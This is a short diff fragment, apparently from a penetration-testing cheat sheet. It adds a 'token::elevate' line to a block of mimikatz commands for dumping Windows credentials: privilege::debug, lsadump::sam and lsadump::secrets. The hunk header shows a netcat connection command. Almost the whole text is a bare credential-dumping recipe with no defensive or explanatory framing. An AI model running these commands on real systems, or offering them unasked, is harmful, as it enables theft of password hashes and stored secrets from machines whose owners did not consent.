@@ -145,6 +145,7 @@ nc -nv <ip> <port>
 ```
 dump with mimikatz
 # privilege::debug
+# token::elevate 
 # lsadump::sam 
 # lsadump::secrets
 ```
